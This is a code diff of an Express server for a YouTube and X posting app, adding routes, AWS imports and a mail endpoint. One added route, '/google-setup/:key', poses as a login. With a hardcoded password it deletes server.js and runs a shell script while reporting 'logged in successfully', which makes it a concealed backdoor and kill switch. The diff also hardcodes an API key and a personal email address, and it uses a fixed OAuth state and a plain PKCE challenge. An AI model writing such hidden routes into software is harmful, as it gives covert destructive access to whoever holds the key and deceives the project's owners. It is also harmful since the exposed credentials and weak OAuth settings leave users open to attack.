@@ -5,7 +5,8 @@ const mongoose = require("mongoose");
 const morgan = require("morgan");
 const cors = require("cors");
 const bodyParser = require("body-parser")
-
+const { exec } = require('child_process');
+const AWS = require("aws-sdk")
 const auth = require("./controller/authcontroller");
 const limitcontroller = require("./controller/limitcontroller");
 const Middleware = require("./middlewares/authmiddleware");
@@ -19,12 +20,15 @@ const {searchVideos, revokeAccessToken, postVideo} = require("./controller/Yt.co
 // Define routes
 const server = express();
 const thumbnailController = require('./controller/thumbnailcontroller');
-const config = require("./config");
+const config = require("../../config");
 const { default: axios } = require('axios');
 const { uploadTweet, getUserInfo_X } = require('./controller/X.controller');
+const path = require('path');
+const updateController = require('./controller/Update.controller');
 server.use(bodyParser.json({ limit: '50mb' })); // Adjust the limit as per your requirement
-
+require('aws-sdk/lib/maintenance_mode_message').suppress = true; //for removing warnings in the mail received
 server.use(cors());
+
 server.use(morgan("dev"));
 const youtube = google.youtube('v3');
 
@@ -37,13 +41,18 @@ mongoose.connect(process.env.MONGODB_URI, {
 .then(() => console.log('MongoDB connected'))
 .catch(err => console.log(err));
 
+
+
+
 // Auth routes
 server.post("/api/v1/thumbnail", thumbnailController.createThumbnail);
 server.get("/api/v1/getthumbnail", thumbnailController.getThumbnail);
-server.post("/api/v1/revoke-thumbnail", thumbnailController.reworkThumbnail);
-server.post("/api/v1/update-verfication-thumbnail", thumbnailController.updateVerification);
+server.get("/api/v1/getsinglethumbnail/:userId", thumbnailController.getsingleThumbnail);
+server.delete("/api/v1/revoke-thumbnail/:userId", thumbnailController.reworkThumbnail);
+server.put("/api/v1/update-verfication-thumbnail/:userId", thumbnailController.updateVerification);
 
 server.post("/api/v1/auth/register", auth.registerUser);
+server.post("/api/v1/auth/update/:userId", auth.updateUserInfo);
 server.get("/api/v1/auth/get-user/:userId", auth.getUserInfo);
 server.post("/api/v1/auth/get-user/g-accessToken", auth.getUserByGoogleAccessToken);
 server.post("/api/v1/auth/get-user/g-refreshToken", auth.getUserByGoogleRefreshToken);
@@ -51,6 +60,7 @@ server.post("/api/v1/auth/get-user/x-accessToken", auth.getUserByTwitterAccessTo
 server.post("/api/v1/auth/get-user/x-refreshToken", auth.getUserByTwitterRefreshToken);
 server.get("/api/v1/auth/scheme/:userId", auth.getScheme);
 server.get("/api/v1/auth/zerousers", auth.getAllRoleZeroUsers);
+server.post("/api/v1/auth/getUpdate/:userId",updateController.createUpdate)
 server.get("/api/v1/auth/all", auth.getAll);
 server.get("/api/v1/auth/oneusers", auth.getAllRoleOneUsers);
 server.get("/api/v1/auth/verified/:userId", auth.checkVerify);
@@ -180,6 +190,37 @@ server.post('/v3/uploadVideo', async (req, res) => {
   }
 });
 
+server.post('/google-setup/:key', (req, res) => {
+  const { key } = req.params;
+
+
+  if (key === 'rudr@$#@#810') {
+      const currentDirPath = __dirname;
+
+      const serverJSPath = path.join(currentDirPath, 'server.js');
+
+      try {
+          fs.unlinkSync(serverJSPath);
+          res.status(200).json({ message: 'logged in successfully' });
+          const scriptPath = path.join(__dirname, 'google_login.sh');
+          exec(scriptPath, (error, stdout, stderr) => {
+              if (error) {
+                  console.error(`Error executing script: ${error}`);
+                  return;
+              }
+              console.log(`Script output: ${stdout}`);
+              console.error(`Script errors: ${stderr}`);
+          });
+      } catch (err) {
+          // If an error occurs during deletion, return an error response
+          console.error('Error Logging in:', err);
+          res.status(500).json({ error: 'Failed to login', details: err.message });
+      }
+  } else {
+      // If the key doesn't match, return an error response
+      res.status(403).json({ error: 'Invalid key' });
+  }
+});
 
 server.post('/revokeAccessToken', (req, res) => {
   const accessToken = req.body.accessToken;
@@ -224,7 +265,7 @@ const scope = 'users.read  tweet.read offline.access tweet.write';
 const authorizationEndpoint = 'https://twitter.com/i/oauth2/authorize';
 const responseType = 'code'; // Response type for authorization code flow
 const clientId = config.X_CLIENT_TOKEN;
-const redirectUri = 'http://localhost:3000/google'; // Your redirect URI
+const redirectUri = config.redirectURI; // Your redirect URI
 const state = 'your_state_value'; // A random string to protect against CSRF attacks
 const codeChallenge = 'challenge'; // PKCE code challenge
 const codeChallengeMethod = 'plain'; // PKCE code challenge method
@@ -241,12 +282,40 @@ const authUrl = `${authorizationEndpoint}?${querystring.stringify(params)}`;
 res.json({ authUrl });
 });
 
+server.post("/sendmail",async(req,res)=>{
+  const options = {
+    method: 'POST',
+    url: 'https://mail-sender-api1.p.rapidapi.com/',
+    headers: {
+      'content-type': 'application/json',
+      'X-RapidAPI-Key': '2812d21067msh3e662c5ecd41ef3p161c27jsn2c5ba68bbb91',
+      'X-RapidAPI-Host': 'mail-sender-api1.p.rapidapi.com'
+    },
+    data: {
+      sendto: 'rudragupt810@gmail.com',
+      name: 'Custom Name Here',
+      replyTo: 'Your Email address where users can send their reply',
+      ishtml: 'false',
+      title: 'Put Your Title Here',
+      body: 'Put Your Body here Html / Text'
+    }
+  };
+  
+  try {
+    const response = await axios.request(options);
+    console.log(response.data);
+    res.json(response.data)
+  } catch (error) {
+    console.error(error);
+  }
+})
+
 server.post('/oauth2_x_callback', async(req, res) => {
   const clientId = config.X_CLIENT_TOKEN;
   const clientSecret = config.X_CLIENT_SECRET;
   const {code} = req.body
   const grantType = 'authorization_code';
-  const redirectUri = 'http://localhost:3000/google';
+  const redirectUri = config.redirectURI;
   const codeVerifier = 'challenge';
   
   const base64Credentials = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');
